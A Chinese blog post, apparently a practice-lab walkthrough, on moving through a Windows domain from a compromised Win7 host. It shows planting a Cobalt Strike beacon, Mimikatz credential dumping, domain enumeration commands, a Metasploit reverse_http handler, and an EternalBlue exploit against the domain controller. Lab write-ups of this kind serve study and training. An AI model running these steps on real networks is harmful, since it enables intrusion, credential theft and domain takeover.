<h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>目的是通过win7外网服务器主机的控制权，横向渗透内网，拿下域控。首先进行内网信息收集，摸清内网域组成和网络拓扑。</p>
<h3 id="CS-Backdoor上线"><a href="#CS-Backdoor上线" class="headerlink" title="CS Backdoor上线"></a>CS Backdoor上线</h3><p>拿下服务器权限要植入Backdoor，可以尝试MSF或者CS。这里使用CS。</p>
<p>使用kali运行CS服务,先下载CS并放到kali上，切换到CS目录</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver kali的<span class="built_in">IP</span>  密码 <span class="comment">//启动CS</span></span><br></pre></td></tr></table></figure>
<p>本机开启客户端，连接kali<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4yPD"><img src="https://i.imgtg.com/2022/06/02/n4yPD.png" alt="n4yPD.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4pT6"><img src="https://i.imgtg.com/2022/06/02/n4pT6.png" alt="n4pT6.png"></a><br>生成exe可执行Backdoor程序<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4JvP"><img src="https://i.imgtg.com/2022/06/02/n4JvP.png" alt="n4JvP.png"></a><br>把exe通过蚁剑放到win7的网站目录下<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Pdb"><img src="https://i.imgtg.com/2022/06/02/n4Pdb.png" alt="n4Pdb.png"></a><br>蚁剑运行exe文件，CS靶机上线<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4tOl"><img src="https://i.imgtg.com/2022/06/02/n4tOl.png" alt="n4tOl.png"></a></p>
<p>使用提权功能，提权为system权限<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Cac"><img src="https://i.imgtg.com/2022/06/02/n4Cac.png" alt="n4Cac.png"></a><br>使用Mimikatz抓取本机用户密码（注意的是，mimikatz需要过杀软，而需要的免杀又是另一个研究方向了）<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4wer"><img src="https://i.imgtg.com/2022/06/02/n4wer.png" alt="n4wer.png"></a><br>在View里的credentials里可以看到hashdump与mimikatz获取的数据<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDMGM"><img src="https://i.imgtg.com/2022/06/02/nDMGM.png" alt="nDMGM.png"></a><br>win7的登录密码出来了。</p>
<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>进入beacon，通过shell+命令进行收集信息。查询域控以及域内的其他主机，附上部分内网信息收集的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net view                 <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">net config Workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net user                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net user 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net group /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net group 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  <span class="comment"># 查看域控制器主机名（可能有多台）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.判断是否存在域，</p>
<blockquote>
<p>net config workstation &#x2F;&#x2F;查看本机的计算机名、用户名、系统版本、工作站、域、登录域的全面信息</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Q9S"><img src="https://i.imgtg.com/2022/06/02/n4Q9S.png" alt="n4Q9S.png"></a></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断域：</span><br><span class="line">	<span class="number">1</span><span class="selector-class">.ipconfig</span> \<span class="attribute">all</span></span><br><span class="line">	<span class="number">2</span><span class="selector-class">.systeminfo</span></span><br><span class="line">	<span class="number">3</span><span class="selector-class">.net</span> <span class="selector-tag">time</span> /domain </span><br><span class="line">		<span class="number">1</span>.存在域，当前用户不是域用户</span><br><span class="line">		<span class="number">2</span>.存在域，当前用户是域用户</span><br><span class="line">		<span class="number">3</span>.不存在域</span><br><span class="line">	<span class="number">4</span><span class="selector-class">.shell</span> net view /domain <span class="comment">//查看当前域</span></span><br></pre></td></tr></table></figure>
<p>2.查看有几个域</p>
<blockquote>
<p>net view &#x2F;domain</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDzGg"><img src="https://i.imgtg.com/2022/06/02/nDzGg.png" alt="nDzGg.png"></a><br>DNS服务器名为god.org,当前登录域为GOD，只存在一个域。</p>
<p>3.查看域控制器的主机用户名,确认域控主机</p>
<blockquote>
<p>net group “domain controllers” &#x2F;domain</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDF3B"><img src="https://i.imgtg.com/2022/06/02/nDF3B.png" alt="nDF3B.png"></a><br>发现域控主机名为OWA</p>
<p>4.查询域内的存活主机信息,得知域控主机的IP为192.168.52.138，为win8域控主机。</p>
<blockquote>
<p>net view</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDntK"><img src="https://i.imgtg.com/2022/06/02/nDntK.png" alt="nDntK.png"></a></p>
<p>5.发现局域网还存在另一台主机（名称为ROOT-TVI862UBEH），确认该主机是否存在域内。查看域中的其他主机名。</p>
<blockquote>
<p>shell net group “domain computers” &#x2F;domain</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDNWS"><img src="https://i.imgtg.com/2022/06/02/nDNWS.png" alt="nDNWS.png"></a></p>
<p>确认域控主机为192.168.52.138,存在另一台域成员192.168.52.141（Win3），接下来就是进行横向渗透拿下域控。</p>
<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>通过WIn7跳板机，横向渗透拿下内网域内的域成员和域控主机。内网主机漏洞多存在于系统老旧，未打补丁。</p>
<h3 id="CS派生会话给MSF"><a href="#CS派生会话给MSF" class="headerlink" title="CS派生会话给MSF"></a>CS派生会话给MSF</h3><p>1.在kali进行MSF监听</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_http</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.123.106</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 6666</span></span><br><span class="line">exploit </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDKoL"><img src="https://i.imgtg.com/2022/06/02/nDKoL.png" alt="nDKoL.png"></a><br>2.CS开启监听<br>回到CS的客户端添加监听器，Payload为windows&#x2F;foreign&#x2F;reverse_http，IP为MSF的IP，监听端口为MSF监听的端口<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDy3t"><img src="https://i.imgtg.com/2022/06/02/nDy3t.png" alt="nDy3t.png"></a><br>3.进行派生会话，从CS-MSF，选择刚才创建的监听器<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDmix"><img src="https://i.imgtg.com/2022/06/02/nDmix.png" alt="nDmix.png"></a><br>返回kali的MSF获得shell会话<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDptj"><img src="https://i.imgtg.com/2022/06/02/nDptj.png" alt="nDptj.png"></a><br>4.MSF简单利用<br>调用post&#x2F;windows&#x2F;gather&#x2F;checkvm判断靶机是否为虚拟机<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDJ2p"><img src="https://i.imgtg.com/2022/06/02/nDJ2p.png" alt="nDJ2p.png"></a><br>调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块枚举列出安装在靶机上的应用程序<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDRbU"><img src="https://i.imgtg.com/2022/06/02/nDRbU.png" alt="nDRbU.png"></a></p>
<h3 id="MSF进行永恒之蓝"><a href="#MSF进行永恒之蓝" class="headerlink" title="MSF进行永恒之蓝"></a>MSF进行永恒之蓝</h3><p>借助MSF集成的攻击模块拿下内网其他机器。</p>
<p>1.首先配置静态路由，MSF访问不到内网机器，可以在MSF基础上添加一条去往内网的路由，就可以使用MSF访问原本访问不到的内网资源。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">run</span> post/multi/manage/autoroute</span><br><span class="line">meterpreter &gt; <span class="built_in">run</span> post/multi/manage/autoroute <span class="attribute">SUBNET</span>=192.168.52.0 <span class="attribute">ACTION</span>=ADD</span><br></pre></td></tr></table></figure>
<p>添加失败，路由已经存在<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDHqq"><img src="https://i.imgtg.com/2022/06/02/nDHqq.png" alt="nDHqq.png"></a><br>2.返回MSF对内网主机探测端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="attribute">msf6</span> &gt; set rhosts <span class="number">192.168.52.141</span> </span><br><span class="line"><span class="attribute">msf6</span> &gt; set ports <span class="number">80</span>,<span class="number">135</span>-<span class="number">139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; run</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDLrc"><img src="https://i.imgtg.com/2022/06/02/nDLrc.png" alt="nDLrc.png"></a><br>发现开启了139和445端口，利用同方法对域控主机192.168.52.138进行端口扫描</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="attribute">msf6</span> &gt; set rhosts <span class="number">192.168.52.138</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; set ports <span class="number">80</span>,<span class="number">135</span>-<span class="number">139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; run</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDEQr"><img src="https://i.imgtg.com/2022/06/02/nDEQr.png" alt="nDEQr.png"></a><br>3.使用ms17-010攻击<br>使用msf漏洞扫描模块进行扫描</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt;search ms17_010 <span class="comment">#搜索MSF集成的与ms17_010漏洞相关的模块</span></span><br><span class="line">msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 <span class="comment"># 加载扫描exp</span></span><br><span class="line">msf6 &gt;<span class="keyword">set</span> rhosts <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span> <span class="comment">#设置被扫描的主机IP</span></span><br><span class="line">msf6 &gt;<span class="built_in">run</span>  <span class="comment">#进行扫描，观察是否存在该漏洞</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现都存在ms17-010漏洞<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDSiG"><img src="https://i.imgtg.com/2022/06/02/nDSiG.png" alt="nDSiG.png"></a><br>使用exp进行攻击</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 &gt; <span class="keyword">set</span> rhost <span class="comment">192.168.52.138</span></span><br><span class="line">msf6 <span class="comment">&gt; run</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDu6K"><img src="https://i.imgtg.com/2022/06/02/nDu6K.png" alt="nDu6K.png"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大体思路如下<br><img src="https://i.imgtg.com/2022/06/27/Nxhka.png" alt="Nxhka.png"><br>对于内网我参考了很多博主，也学习到一些思路和原理。在正常渗透测试中，不可能一帆风顺。要知道原理，尝试不同的方法。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_31773159/article/details/113910351">msf各种弱口令爆破</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114184542">phpmyadmin渗透利用</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/268593.html">内网信息收集</a><br><a target="_blank" rel="noopener" href="https://bwshen.blog.csdn.net/article/details/118338328">windows域环境身份认证与攻击思路</a><br><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/632621.html">域内密码抓取方法总结</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107856140">CS与MSF之间的会话派发与端口转发</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">l3ife</p>
  <div class="site-description" itemprop="description">谁想当安全混子呢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
	
	  
		<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
		<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
		<div class="widget-wrap">
			<h3 class="widget-title">Tag Cloud</h3>
			<div id="myCanvasContainer" class="widget tagcloud">
				<canvas width="250" height="250" id="resCanvas" style="width=100%">
					<ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/a/" rel="tag">a</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a><span class="tag-list-count">1</span></li></ul>
				</canvas>
			</div>
		</div>
	   

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">l3ife</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
